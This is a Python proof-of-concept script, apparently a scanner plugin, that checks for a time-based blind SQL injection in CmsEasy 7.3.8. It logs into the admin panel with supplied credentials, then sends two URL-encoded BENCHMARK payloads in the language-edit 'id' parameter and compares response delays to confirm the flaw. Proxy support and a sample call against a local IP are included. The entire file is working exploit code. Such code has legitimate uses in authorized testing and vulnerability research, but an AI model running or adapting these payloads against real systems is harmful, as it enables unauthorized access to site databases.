# coding: utf-8
import requests
import datetime

#CmsEasy 7.3.8 sql注入漏洞
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    exp_url1 = url  + '/index.php?case=language&act=edit&admin_dir=admin&site=default27&id=1%20and%20if(1,BENCHMARK(1,md5(1)),1)%23'
    exp_url2 = url  + '/index.php?case=language&act=edit&admin_dir=admin&site=default27&id=1%20and%20if(1,BENCHMARK(5000000,md5(1)),1)%23'

    username = logindict.keys()
    password = logindict.values()
    #登录
    logurl = url + '/index.php?case=admin&act=login&admin_dir=admin&site=default'
    header = {'User-Agent': user_agent}

    sesion = requests.session()
    data = {
        "submit": '%E6%8F%90%E4%BA%A4',
        "username": username,
        "password": password
    }
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = sesion.post(logurl, headers=header, data=data, proxies=proxies)
    else:
        response = sesion.post(logurl, headers=header, data=data)
    # print(response.text)
    if response.status_code==200 and "后台管理" in response.text:
        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            start = datetime.datetime.now()
            response = sesion.get(exp_url1, headers=header, proxies=proxies)
            end = datetime.datetime.now()
            time1=str((end - start).seconds)

            start = datetime.datetime.now()
            response = sesion.get(exp_url2, headers=header, proxies=proxies)
            end = datetime.datetime.now()
            time2=str((end - start).seconds)
        else:
            start = datetime.datetime.now()
            response = sesion.get(exp_url1, headers=header)
            end = datetime.datetime.now()
            time1=str((end - start).seconds)

            start = datetime.datetime.now()
            response = sesion.get(exp_url2, headers=header)
            end = datetime.datetime.now()
            time2=str((end - start).seconds)


        if (int(time2)-int(time1))>3 and response.status_code==200:
            return 'CmsEasy 7.3.8 - sql注入漏洞'


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url, logindict, user_agent, proxies)
        return result

# run('http://192.168.220.128/CmsEasy/CmsEasy_7.3.8_UTF-8/',{'admin':'admin'},'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)','')
